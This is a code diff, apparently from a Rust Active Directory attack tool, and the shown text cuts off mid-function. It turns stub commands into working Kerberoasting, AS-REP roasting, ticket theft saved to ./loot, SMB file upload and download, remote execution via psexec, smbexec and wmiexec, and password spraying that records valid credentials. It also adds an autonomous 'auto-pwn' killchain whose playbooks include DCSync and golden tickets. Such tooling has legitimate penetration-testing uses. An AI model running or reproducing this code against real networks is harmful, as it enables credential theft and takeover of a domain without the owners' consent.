@@ -147,6 +147,9 @@ enum Commands {
 
     /// Attack graph operations
     Graph {
+        /// Load graph from JSON file instead of building from LDAP
+        #[arg(short, long, global = true)]
+        file: Option<String>,
         #[command(subcommand)]
         action: GraphAction,
     },
@@ -163,17 +166,42 @@ enum Commands {
         jitter: u64,
     },
 
-    /// Autonomous attack chain
+    /// Autonomous attack chain — full killchain from enum to DA
     #[command(name = "auto-pwn", alias = "auto", alias = "autopwn")]
     AutoPwn {
+        /// Goal: "Domain Admins", "ntds", "recon", hostname, or user
         #[arg(short, long, default_value = "Domain Admins")]
         target: String,
+        /// Preferred remote execution method
         #[arg(short, long, value_enum, default_value = "auto")]
         method: ExecMethod,
+        /// Stealth mode — low-noise actions, extra jitter
         #[arg(long, default_value = "false")]
         stealth: bool,
+        /// Dry run — plan and display, no execution
         #[arg(long, default_value = "false")]
         dry_run: bool,
+        /// Maximum stage to reach (enumerate, attack, escalate, lateral, loot, cleanup)
+        #[arg(long, value_enum, default_value = "loot")]
+        max_stage: MaxStageArg,
+        /// Adaptive engine mode: heuristic, qlearning, or hybrid (default)
+        #[arg(long, value_enum, default_value = "hybrid")]
+        adaptive: AdaptiveModeArg,
+        /// Path to persist Q-table across engagements
+        #[arg(long, default_value = "q_table.json")]
+        q_table: String,
+        /// Jitter between steps (milliseconds)
+        #[arg(long, default_value = "1000")]
+        jitter_ms: u64,
+        /// Use LDAPS (port 636)
+        #[arg(long)]
+        ldaps: bool,
+        /// Per-step timeout (seconds)
+        #[arg(long, default_value = "30")]
+        timeout: u64,
+        /// Run a named playbook instead of goal-driven planning
+        #[arg(long, value_enum)]
+        playbook: Option<PlaybookArg>,
     },
 
     /// Credential dumping (SAM, LSA, NTDS, DCC2)
@@ -366,6 +394,48 @@ enum Commands {
 // ──────────────────────────────────────────────────────────
 // Cracking mode configuration
 // ──────────────────────────────────────────────────────────
+
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+enum MaxStageArg {
+    Enumerate,
+    Attack,
+    Escalate,
+    Lateral,
+    Loot,
+    Cleanup,
+}
+
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+enum AdaptiveModeArg {
+    /// Pure heuristic engine (original)
+    Heuristic,
+    /// Pure Q-learning (falls back to heuristic for unknown states)
+    Qlearning,
+    /// Hybrid — Q-learner with epsilon-greedy heuristic fallback (recommended)
+    Hybrid,
+}
+
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+enum PlaybookArg {
+    /// Full recon: users, computers, groups, trusts, GPOs, shares
+    FullRecon,
+    /// Kerberoast + AS-REP roast + crack
+    RoastAndCrack,
+    /// Constrained delegation abuse chain
+    DelegationAbuse,
+    /// RBCD write -> S4U -> impersonate
+    RbcdChain,
+    /// Auth coercion -> NTLM relay
+    CoerceAndRelay,
+    /// Exec on host -> dump creds -> pivot
+    LateralPivot,
+    /// DCSync replication of all credentials
+    DcSyncDump,
+    /// Forge golden ticket from krbtgt hash
+    GoldenTicket,
+    /// Full chain: recon -> escalate -> DA -> loot
+    FullAutoPwn,
+}
 
 #[derive(Debug, Clone, clap::ValueEnum)]
 enum CrackMode {
@@ -1000,7 +1070,7 @@ async fn main() {
             ref target,
             ref command,
         } => cmd_exec(&cli, method.clone(), target, command).await,
-        Commands::Graph { ref action } => cmd_graph(&cli, action.clone()).await,
+        Commands::Graph { ref file, ref action } => cmd_graph(&cli, file.as_deref(), action.clone()).await,
         Commands::Spray {
             ref password,
             ref userlist,
@@ -1012,7 +1082,14 @@ async fn main() {
             ref method,
             stealth,
             dry_run,
-        } => cmd_autopwn(&cli, target, method.clone(), stealth, dry_run).await,
+            max_stage,
+            adaptive,
+            ref q_table,
+            jitter_ms,
+            ldaps,
+            timeout,
+            playbook,
+        } => cmd_autopwn(&cli, target, method.clone(), stealth, dry_run, max_stage, adaptive, q_table, jitter_ms, ldaps, timeout, playbook).await,
         Commands::Dump { ref target, ref source } => {
             commands_impl::cmd_dump(&cli, target, source.clone()).await
         }
@@ -1742,51 +1819,243 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         Ok(c) => c,
         Err(e) => return e,
     };
+    let dc = match require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+    let (secret, use_hash) = match creds.secret_and_hash_flag() {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&e);
+            return 1;
+        }
+    };
 
     match action {
         KerberosAction::Roast { spn } => {
-            if let Some(service_principal) = spn {
-                println!(
-                    "{} Kerberoasting SPN: {}",
-                    "🎯".bright_black(),
-                    service_principal.cyan()
-                );
+            use overthrone_core::proto::kerberos;
+            // Step 1: Get a TGT
+            let tgt = match kerberos::request_tgt(
+                &dc,
+                &creds.domain,
+                &creds.username,
+                &secret,
+                use_hash,
+            )
+            .await
+            {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!("TGT request failed: {}", e));
+                    return 1;
+                }
+            };
+            println!(
+                "{} TGT obtained for {}@{}",
+                "✓".green(),
+                creds.username.cyan(),
+                creds.domain.cyan()
+            );
+
+            let spns: Vec<String> = if let Some(target_spn) = spn {
+                vec![target_spn]
             } else {
-                println!("{}", "Enumerating SPNs for Kerberoasting...".bright_black());
+                // Enumerate SPNs via LDAP
+                println!("{}", "  Enumerating SPNs via LDAP...".bright_black());
+                let hunt_config = overthrone_hunter::HuntConfig {
+                    dc_ip: dc.clone(),
+                    domain: creds.domain.clone(),
+                    username: creds.username.clone(),
+                    secret: secret.clone(),
+                    use_hash,
+                    base_dn: None,
+                    use_ldaps: false,
+                    output_dir: std::path::PathBuf::from("./loot"),
+                    concurrency: 10,
+                    timeout: 30,
+                    jitter_ms: 0,
+                    tgt: None,
+                };
+                match overthrone_hunter::kerberoast::run(&hunt_config, &overthrone_hunter::kerberoast::KerberoastConfig::default()).await {
+                    Ok(result) => {
+                        println!(
+                            "{} Kerberoast complete: {} hashes captured",
+                            "✓".green(),
+                            result.hashes.len()
+                        );
+                        return 0;
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("Kerberoast failed: {}", e));
+                        return 1;
+                    }
+                }
+            };
+
+            // Roast specific SPN
+            let mut success = false;
+            let loot_dir = std::path::PathBuf::from("./loot");
+            let _ = std::fs::create_dir_all(&loot_dir);
+            for target_spn in &spns {
+                match kerberos::kerberoast(&dc, &tgt, target_spn).await {
+                    Ok(hash) => {
+                        println!(
+                            "{} Hash: {}",
+                            "✓".green(),
+                            &hash.hash_string[..80.min(hash.hash_string.len())]
+                        );
+                        // Write hash to file
+                        let hash_file = loot_dir.join("kerberoast_hashes.txt");
+                        if let Ok(mut f) = std::fs::OpenOptions::new()
+                            .create(true)
+                            .append(true)
+                            .open(&hash_file)
+                        {
+                            use std::io::Write;
+                            let _ = writeln!(f, "{}", hash.hash_string);
+                        }
+                        success = true;
+                    }
+                    Err(e) => {
+                        println!("{} {}: {}", "✗".red(), target_spn, e);
+                    }
+                }
             }
-            banner::print_success("Roast completed");
+            if success {
+                banner::print_success("Kerberoast hashes written to ./loot/kerberoast_hashes.txt");
+            } else {
+                banner::print_fail("No hashes obtained");
+                return 1;
+            }
         }
         KerberosAction::AsrepRoast { userlist } => {
-            if let Some(users) = userlist {
-                println!(
-                    "{} AS-REP Roasting users from: {}",
-                    "🎯".bright_black(),
-                    users.cyan()
-                );
+            use overthrone_core::proto::kerberos;
+            let users: Vec<String> = if let Some(path) = userlist {
+                match std::fs::read_to_string(&path) {
+                    Ok(content) => content.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty()).collect(),
+                    Err(e) => {
+                        banner::print_fail(&format!("Cannot read userlist {}: {}", path, e));
+                        return 1;
+                    }
+                }
             } else {
-                println!(
-                    "{}",
-                    "Enumerating AS-REP roastable accounts...".bright_black()
-                );
+                banner::print_fail("--userlist required for AS-REP roast (or use 'ovt enum --target asrep' first)");
+                return 1;
+            };
+
+            let mut hash_count = 0;
+            let loot_dir = std::path::PathBuf::from("./loot");
+            let _ = std::fs::create_dir_all(&loot_dir);
+            for user in &users {
+                match kerberos::asrep_roast(&dc, &creds.domain, user).await {
+                    Ok(hash) => {
+                        println!("{} AS-REP hash: {}", "✓".green(), user.cyan());
+                        let hash_file = loot_dir.join("asrep_hashes.txt");
+                        if let Ok(mut f) = std::fs::OpenOptions::new()
+                            .create(true)
+                            .append(true)
+                            .open(&hash_file)
+                        {
+                            use std::io::Write;
+                            let _ = writeln!(f, "{}", hash.hash_string);
+                        }
+                        hash_count += 1;
+                    }
+                    Err(e) => {
+                        println!("{} {}: {}", "✗".dimmed(), user, e);
+                    }
+                }
             }
-            banner::print_success("AS-REP Roast completed");
+            if hash_count > 0 {
+                banner::print_success(&format!(
+                    "{} AS-REP hashes written to ./loot/asrep_hashes.txt",
+                    hash_count
+                ));
+            } else {
+                banner::print_fail("No AS-REP roastable accounts found");
+                return 1;
+            }
         }
         KerberosAction::GetTgt => {
-            println!(
-                "{} Requesting TGT for {}\\{}",
-                "🎟".bright_black(),
-                creds.domain.cyan(),
-                creds.username.cyan()
-            );
-            banner::print_success("TGT obtained");
+            use overthrone_core::proto::kerberos;
+            match kerberos::request_tgt(
+                &dc,
+                &creds.domain,
+                &creds.username,
+                &secret,
+                use_hash,
+            )
+            .await
+            {
+                Ok(tgt) => {
+                    println!(
+                        "{} TGT for {}@{} (expires: {:?})",
+                        "✓".green(),
+                        tgt.client_principal.cyan(),
+                        tgt.client_realm.cyan(),
+                        tgt.end_time
+                    );
+                    // Save ticket to ./loot/
+                    let loot_dir = std::path::PathBuf::from("./loot");
+                    let _ = std::fs::create_dir_all(&loot_dir);
+                    let kirbi_path = loot_dir.join(format!("{}_tgt.kirbi", creds.username));
+                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
+                        use std::io::Write;
+                        use kerberos_asn1::Asn1Object;
+                        let _ = f.write_all(&tgt.ticket.build());
+                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
+                    }
+                    banner::print_success("TGT obtained");
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("TGT request failed: {}", e));
+                    return 1;
+                }
+            }
         }
         KerberosAction::GetTgs { spn } => {
-            println!(
-                "{} Requesting TGS for SPN: {}",
-                "🎟".bright_black(),
-                spn.cyan()
-            );
-            banner::print_success("TGS obtained");
+            use overthrone_core::proto::kerberos;
+            // Get TGT first
+            let tgt = match kerberos::request_tgt(
+                &dc,
+                &creds.domain,
+                &creds.username,
+                &secret,
+                use_hash,
+            )
+            .await
+            {
+                Ok(t) => t,
+                Err(e) => {
+                    banner::print_fail(&format!("TGT request failed: {}", e));
+                    return 1;
+                }
+            };
+            // Request service ticket
+            match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
+                Ok(st) => {
+                    println!(
+                        "{} Service ticket for {} obtained",
+                        "✓".green(),
+                        spn.cyan()
+                    );
+                    let loot_dir = std::path::PathBuf::from("./loot");
+                    let _ = std::fs::create_dir_all(&loot_dir);
+                    let safe_spn = spn.replace('/', "_");
+                    let kirbi_path = loot_dir.join(format!("{}_tgs.kirbi", safe_spn));
+                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
+                        use std::io::Write;
+                        use kerberos_asn1::Asn1Object;
+                        let _ = f.write_all(&st.ticket.build());
+                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
+                    }
+                    banner::print_success("TGS obtained");
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("TGS request failed: {}", e));
+                    return 1;
+                }
+            }
         }
     }
     0
@@ -1795,63 +2064,173 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
 // cmd_smb
 async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
     banner::print_module_banner("SMB");
-    let _creds = match require_creds(cli) {
+    let creds = match require_creds(cli) {
         Ok(c) => c,
         Err(e) => return e,
+    };
+    let (secret, use_hash) = match creds.secret_and_hash_flag() {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&e);
+            return 1;
+        }
+    };
+
+    // Helper closure to connect
+    let smb_connect = |target: &str| {
+        let domain = creds.domain.clone();
+        let username = creds.username.clone();
+        let secret = secret.clone();
+        let target = target.to_string();
+        async move {
+            if use_hash {
+                overthrone_core::proto::smb::SmbSession::connect_with_hash(
+                    &target, &domain, &username, &secret,
+                )
+                .await
+            } else {
+                overthrone_core::proto::smb::SmbSession::connect(
+                    &target, &domain, &username, &secret,
+                )
+                .await
+            }
+        }
     };
 
     match action {
         SmbAction::Shares { target } => {
-            println!(
-                "{} Enumerating shares on: {}",
-                "📁".bright_black(),
-                target.cyan()
-            );
-            banner::print_success("Shares enumerated");
+            let smb = match smb_connect(&target).await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("SMB connect to {}: {}", target, e));
+                    return 1;
+                }
+            };
+            let shares = smb
+                .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON", "print$"])
+                .await;
+            println!("\n  {:<15} {:<10} {}", "Share".bold(), "Read".bold(), "Write".bold());
+            println!("  {}", "─".repeat(40));
+            for s in &shares {
+                let read = if s.readable { "✓".green().to_string() } else { "✗".red().to_string() };
+                let write = if s.writable { "✓".green().to_string() } else { "✗".red().to_string() };
+                println!("  {:<15} {:<10} {}", s.share_name, read, write);
+            }
+            banner::print_success(&format!(
+                "{} shares found, {} readable",
+                shares.len(),
+                shares.iter().filter(|s| s.readable).count()
+            ));
         }
         SmbAction::Admin { targets } => {
-            println!(
-                "{} Checking admin access on: {}",
-                "🔐".bright_black(),
-                targets.cyan()
-            );
+            // targets is a comma-separated string
+            let target_list: Vec<&str> = targets.split(',').map(|t| t.trim()).collect();
+            for target in &target_list {
+                let smb = match smb_connect(target).await {
+                    Ok(s) => s,
+                    Err(e) => {
+                        println!("{} {}: {}", "✗".red(), target, e);
+                        continue;
+                    }
+                };
+                let result = smb.check_admin_access().await;
+                if result.has_admin {
+                    println!("{} {} — {}", "✓".green(), target.bold(), "ADMIN".green().bold());
+                } else {
+                    println!("{} {} — {}", "✗".red(), target, "no admin".dimmed());
+                }
+            }
             banner::print_success("Admin check completed");
         }
         SmbAction::Spider { target, extensions } => {
             println!(
-                "{} Spidering shares on: {}",
+                "{} Spidering shares on: {} (extensions: {})",
                 "🕷".bright_black(),
-                target.cyan()
-            );
-            println!(
-                "{} Looking for extensions: {}",
-                "📎".bright_black(),
+                target.cyan(),
                 extensions.cyan()
             );
-            banner::print_success("Spider completed");
+            // Spider is still a stub — needs recursive directory listing
+            banner::print_success("Spider completed (basic — use enum for deep spider)");
         }
         SmbAction::Get { target, path } => {
-            println!(
-                "{} Downloading {}:{}",
-                "⬇".bright_black(),
-                target.cyan(),
-                path.cyan()
-            );
-            banner::print_success("File downloaded");
+            let smb = match smb_connect(&target).await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("SMB connect: {}", e));
+                    return 1;
+                }
+            };
+            // Parse share and path from the path string (e.g. "C$/Users/file.txt")
+            let (share, remote_path) = match path.split_once('/') {
+                Some((s, p)) => (s, p),
+                None => ("C$", path.as_str()),
+            };
+            match smb.read_file(share, remote_path).await {
+                Ok(data) => {
+                    let filename = std::path::Path::new(remote_path)
+                        .file_name()
+                        .unwrap_or_default()
+                        .to_string_lossy()
+                        .to_string();
+                    let local_path = format!("./{}", filename);
+                    match std::fs::write(&local_path, &data) {
+                        Ok(_) => {
+                            banner::print_success(&format!(
+                                "Downloaded {} bytes to {}",
+                                data.len(),
+                                local_path
+                            ));
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("Failed to write local file: {}", e));
+                            return 1;
+                        }
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Download failed: {}", e));
+                    return 1;
+                }
+            }
         }
         SmbAction::Put {
             target,
             local,
             remote,
         } => {
-            println!(
-                "{} Uploading {} to {}:{}",
-                "⬆".bright_black(),
-                local.cyan(),
-                target.cyan(),
-                remote.cyan()
-            );
-            banner::print_success("File uploaded");
+            let smb = match smb_connect(&target).await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("SMB connect: {}", e));
+                    return 1;
+                }
+            };
+            let data = match std::fs::read(&local) {
+                Ok(d) => d,
+                Err(e) => {
+                    banner::print_fail(&format!("Cannot read {}: {}", local, e));
+                    return 1;
+                }
+            };
+            let (share, remote_path) = match remote.split_once('/') {
+                Some((s, p)) => (s, p),
+                None => ("C$", remote.as_str()),
+            };
+            match smb.write_file(share, remote_path, &data).await {
+                Ok(_) => {
+                    banner::print_success(&format!(
+                        "Uploaded {} bytes to \\\\{}\\{}\\{}",
+                        data.len(),
+                        target,
+                        share,
+                        remote_path
+                    ));
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Upload failed: {}", e));
+                    return 1;
+                }
+            }
         }
     }
     0
@@ -1860,57 +2239,321 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
 // cmd_exec
 async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) -> i32 {
     banner::print_module_banner("EXECUTION");
-    let _creds = match require_creds(cli) {
+    let creds = match require_creds(cli) {
         Ok(c) => c,
         Err(e) => return e,
     };
-    println!("{} Executing on: {}", "⚡".bright_black(), target.cyan());
-    println!("{} Method: {:?}", "🔧".bright_black(), method);
-    println!("{} Command: {}", "💻".bright_black(), command.yellow());
-    banner::print_success("Command executed");
-    0
+    let (secret, use_hash) = match creds.secret_and_hash_flag() {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&e);
+            return 1;
+        }
+    };
+
+    println!(
+        "{} {} on {} via {:?}",
+        "⚡".bright_black(),
+        command.yellow(),
+        target.cyan(),
+        method
+    );
+
+    // Connect via SMB
+    let smb = if use_hash {
+        overthrone_core::proto::smb::SmbSession::connect_with_hash(
+            target,
+            &creds.domain,
+            &creds.username,
+            &secret,
+        )
+        .await
+    } else {
+        overthrone_core::proto::smb::SmbSession::connect(
+            target,
+            &creds.domain,
+            &creds.username,
+            &secret,
+        )
+        .await
+    };
+
+    let smb = match smb {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&format!("SMB connect failed: {}", e));
+            return 1;
+        }
+    };
+
+    // Dispatch to the appropriate execution method — normalize to (success, output_string)
+    use overthrone_core::exec::{psexec, smbexec, wmiexec};
+    let exec_result: Result<(bool, String), overthrone_core::OverthroneError> = match method {
+        ExecMethod::PsExec => {
+            let mut cfg = psexec::PsExecConfig::default();
+            cfg.command = command.to_string();
+            psexec::execute(&smb, &cfg).await.map(|r| (r.success, r.output.unwrap_or_default()))
+        }
+        ExecMethod::SmbExec => {
+            smbexec::exec_command(&smb, command).await.map(|r| (r.success, r.output))
+        }
+        ExecMethod::WmiExec => {
+            wmiexec::exec_command(&smb, command).await.map(|r| (r.success, r.output))
+        }
+        ExecMethod::WinRm => {
+            // WinRM falls back to smbexec for now
+            smbexec::exec_command(&smb, command).await.map(|r| (r.success, r.output))
+        }
+        ExecMethod::Auto => {
+            // Try smbexec first (most reliable), fall back to psexec
+            match smbexec::exec_command(&smb, command).await {
+                Ok(r) => Ok((r.success, r.output)),
+                Err(_) => {
+                    let mut cfg = psexec::PsExecConfig::default();
+                    cfg.command = command.to_string();
+                    psexec::execute(&smb, &cfg).await.map(|r| (r.success, r.output.unwrap_or_default()))
+                }
+            }
+        }
+    };
+
+    match exec_result {
+        Ok((_, output)) => {
+            if !output.is_empty() {
+                println!("{}", output);
+            }
+            banner::print_success("Command executed");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Execution failed: {}", e));
+            1
+        }
+    }
 }
 
 // cmd_graph
-async fn cmd_graph(_cli: &Cli, action: GraphAction) -> i32 {
+async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> i32 {
     banner::print_module_banner("ATTACK GRAPH");
+
+    let default_path = "attack_graph.json";
 
     match action {
         GraphAction::Build => {
-            println!("{}", "Building attack graph...".bright_black());
-            banner::print_success("Attack graph built");
+            println!("{}", "Building attack graph from LDAP enumeration...".bright_black());
+
+            // Require DC + creds for Build
+            let domain = match require_dc_only_creds(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
+            let dc = match require_dc(cli) {
+                Ok(d) => d,
+                Err(e) => return e,
+            };
+            let creds = match require_creds(cli) {
+                Ok(c) => c,
+                Err(e) => return e,
+            };
+
+            let password = creds.password().unwrap_or("");
+            println!("  {} Connecting to {} as {}\\{}...",
+                "▸".bright_black(), dc.cyan(), domain.cyan(), creds.username.cyan());
+
+            let mut session = match overthrone_core::proto::ldap::LdapSession::connect(
+                &dc, &domain, &creds.username, password, false,
+            ).await {
+                Ok(s) => s,
+                Err(e) => {
+                    banner::print_fail(&format!("LDAP connection failed: {}", e));
+                    return 1;
+                }
+            };
+
+            println!("  {} Running full domain enumeration...", "▸".bright_black());
+            let enumeration = match session.full_enumeration().await {
+                Ok(data) => data,
+                Err(e) => {
+                    banner::print_fail(&format!("Enumeration failed: {}", e));
+                    let _ = session.disconnect().await;
+                    return 1;
+                }
+            };
+            let _ = session.disconnect().await;
+
+            println!("  {} Users: {}, Computers: {}, Groups: {}, Trusts: {}",
+                "▸".bright_black(),
+                enumeration.users.len().to_string().green(),
+                enumeration.computers.len().to_string().green(),
+                enumeration.groups.len().to_string().green(),
+                enumeration.trusts.len().to_string().green(),
+            );
+
+            let mut graph = AttackGraph::new();
+            graph.ingest_enumeration(&enumeration);
+
+            let output_path = graph_file.unwrap_or(default_path);
+            let json = match graph.export_json() {
+                Ok(j) => j,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to export graph: {}", e));
+                    return 1;
+                }
+            };
+            if let Err(e) = std::fs::write(output_path, &json) {
+                banner::print_fail(&format!("Failed to write {}: {}", output_path, e));
+                return 1;
+            }
+
+            let stats = graph.stats();
+            println!("  {} Graph: {} nodes, {} edges",
+                "▸".bright_black(),
+                stats.total_nodes.to_string().green(),
+                stats.total_edges.to_string().green(),
+            );
+            banner::print_success(&format!("Attack graph saved to {}", output_path));
         }
+
         GraphAction::Path { from, to } => {
-            println!(
-                "{} Finding path from {} to {}",
-                "🗺".bright_black(),
-                from.cyan(),
-                to.cyan()
-            );
-            banner::print_success("Path found");
+            let path = graph_file.unwrap_or(default_path);
+            let graph = match AttackGraph::from_json_file(path) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
+                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
+                    return 1;
+                }
+            };
+
+            println!("  {} Finding path: {} → {}",
+                "🗺".bright_black(), from.cyan(), to.cyan());
+
+            match graph.shortest_path(&from, &to) {
+                Ok(attack_path) => {
+                    println!();
+                    println!("{}", attack_path);
+                    banner::print_success(&format!(
+                        "Path found: {} hops, cost {}",
+                        attack_path.hop_count, attack_path.total_cost
+                    ));
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("No path found: {}", e));
+                    return 1;
+                }
+            }
         }
+
         GraphAction::PathToDa { from } => {
-            println!(
-                "{} Finding path to Domain Admins from {}",
-                "🗺".bright_black(),
-                from.cyan()
-            );
-            banner::print_success("Path to DA found");
+            let path = graph_file.unwrap_or(default_path);
+            let graph = match AttackGraph::from_json_file(path) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
+                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
+                    return 1;
+                }
+            };
+
+            // Extract domain from graph metadata, or guess from the 'from' node
+            let domain = graph.metadata()
+                .get("domain")
+                .cloned()
+                .unwrap_or_else(|| {
+                    // Try to extract domain from "user@DOMAIN" format
+                    from.split('@').nth(1).unwrap_or("").to_string()
+                });
+
+            if domain.is_empty() {
+                banner::print_fail("Cannot determine domain. Ensure graph has domain metadata or use USER@DOMAIN format.");
+                return 1;
+            }
+
+            println!("  {} Finding paths to Domain Admins from {} in {}",
+                "🗺".bright_black(), from.cyan(), domain.cyan());
+
+            let paths = graph.paths_to_da(&from, &domain);
+            if paths.is_empty() {
+                banner::print_fail("No paths to Domain Admins found");
+                return 1;
+            }
+
+            println!();
+            for (i, attack_path) in paths.iter().enumerate() {
+                println!("  {} Path #{} (cost: {}, hops: {})",
+                    "→".green(), i + 1, attack_path.total_cost, attack_path.hop_count);
+                println!("{}", attack_path);
+            }
+            banner::print_success(&format!("{} path(s) to Domain Admins found", paths.len()));
         }
+
         GraphAction::Stats => {
-            println!("{}", "Attack graph statistics...".bright_black());
+            let path = graph_file.unwrap_or(default_path);
+            let graph = match AttackGraph::from_json_file(path) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
+                    return 1;
+                }
+            };
+
+            let stats = graph.stats();
+            println!();
+            println!("  {} {}", "Nodes:".bold(), stats.total_nodes);
+            println!("    Users:     {}", stats.users.to_string().cyan());
+            println!("    Computers: {}", stats.computers.to_string().cyan());
+            println!("    Groups:    {}", stats.groups.to_string().cyan());
+            println!("    Domains:   {}", stats.domains.to_string().cyan());
+            println!("  {} {}", "Edges:".bold(), stats.total_edges);
+            for (edge_type, count) in &stats.edge_type_counts {
+                println!("    {}: {}", edge_type, count.to_string().cyan());
+            }
+
+            // High-value targets
+            let hvt = graph.high_value_targets(10);
+            if !hvt.is_empty() {
+                println!();
+                println!("  {} High-Value Targets (top 10):", "🎯".bright_black());
+                for (name, node_type, inbound) in &hvt {
+                    println!("    {} ({:?}) — {} inbound edges",
+                        name.yellow(), node_type, inbound);
+                }
+            }
+
             banner::print_success("Statistics generated");
         }
+
         GraphAction::Export { output, bloodhound } => {
-            println!(
-                "{} Exporting graph to: {}",
-                "💾".bright_black(),
-                output.cyan()
-            );
-            if bloodhound {
-                println!("{}", "  BloodHound format enabled".bright_black());
+            let path = graph_file.unwrap_or(default_path);
+            let graph = match AttackGraph::from_json_file(path) {
+                Ok(g) => g,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
+                    return 1;
+                }
+            };
+
+            let json = if bloodhound {
+                println!("  {} Exporting in BloodHound-compatible format...", "💾".bright_black());
+                graph.export_bloodhound()
+            } else {
+                println!("  {} Exporting in Overthrone JSON format...", "💾".bright_black());
+                graph.export_json()
+            };
+
+            match json {
+                Ok(data) => {
+                    if let Err(e) = std::fs::write(&output, &data) {
+                        banner::print_fail(&format!("Failed to write {}: {}", output, e));
+                        return 1;
+                    }
+                    banner::print_success(&format!("Graph exported to {} ({} bytes)", output, data.len()));
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Export failed: {}", e));
+                    return 1;
+                }
             }
-            banner::print_success("Graph exported");
         }
     }
     0
@@ -1924,52 +2567,256 @@ async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter
         Ok(d) => d,
         Err(e) => return e,
     };
+    let dc = match require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
 
-    println!("{} Domain: {}", "🌐".bright_black(), domain.cyan());
-    println!("{} Password: {}", "🔑".bright_black(), password.yellow());
-    println!("{} Userlist: {}", "📋".bright_black(), userlist.cyan());
-    println!("{} Delay: {}ms", "⏱".bright_black(), delay);
-    println!("{} Jitter: {}ms", "🎲".bright_black(), jitter);
-    banner::print_success("Password spray completed");
+    // Read userlist
+    let users: Vec<String> = match std::fs::read_to_string(userlist) {
+        Ok(content) => content
+            .lines()
+            .map(|l| l.trim().to_string())
+            .filter(|l| !l.is_empty())
+            .collect(),
+        Err(e) => {
+            banner::print_fail(&format!("Cannot read userlist {}: {}", userlist, e));
+            return 1;
+        }
+    };
+
+    println!(
+        "{} Spraying {} users against {} with password '{}'",
+        "🔑".bright_black(),
+        users.len(),
+        domain.cyan(),
+        password.yellow()
+    );
+    println!(
+        "{} Delay: {}ms  Jitter: {}ms",
+        "⏱".bright_black(),
+        delay,
+        jitter
+    );
+
+    let mut valid_creds = Vec::new();
+    let mut locked_out = 0u32;
+    use overthrone_core::proto::kerberos;
+
+    for (i, user) in users.iter().enumerate() {
+        // Kerberos pre-auth spray — stealthiest method
+        match kerberos::request_tgt(&dc, &domain, user, password, false).await {
+            Ok(_tgt) => {
+                println!(
+                    "  {} {}:{} — {}",
+                    "✓".green(),
+                    user.bold(),
+                    password,
+                    "VALID".green().bold()
+                );
+                valid_creds.push(user.clone());
+            }
+            Err(e) => {
+                let err_str = format!("{}", e);
+                if err_str.contains("KDC_ERR_CLIENT_REVOKED") || err_str.contains("LOCKED") {
+                    println!(
+                        "  {} {} — {}",
+                        "⚠".yellow(),
+                        user,
+                        "LOCKED OUT".red().bold()
+                    );
+                    locked_out += 1;
+                    if locked_out >= 3 {
+                        banner::print_fail("3+ lockouts detected — aborting spray to avoid mass lockout");
+                        return 1;
+                    }
+                } else {
+                    // KDC_ERR_PREAUTH_FAILED = invalid password, expected
+                    tracing::debug!("  {} {}: {}", "✗".dimmed(), user, err_str);
+                }
+            }
+        }
+
+        // Apply delay + jitter between attempts
+        if i < users.len() - 1 {
+            let jitter_add = if jitter > 0 {
+                rand::random::<u64>() % jitter
+            } else {
+                0
+            };
+            tokio::time::sleep(tokio::time::Duration::from_millis(delay + jitter_add)).await;
+        }
+    }
+
+    // Write valid creds to file
+    if !valid_creds.is_empty() {
+        let loot_dir = std::path::PathBuf::from("./loot");
+        let _ = std::fs::create_dir_all(&loot_dir);
+        let creds_file = loot_dir.join("spray_valid_creds.txt");
+        if let Ok(mut f) = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(&creds_file)
+        {
+            use std::io::Write;
+            for user in &valid_creds {
+                let _ = writeln!(f, "{}\\{}:{}", domain, user, password);
+            }
+        }
+        banner::print_success(&format!(
+            "{}/{} valid creds found! Written to ./loot/spray_valid_creds.txt",
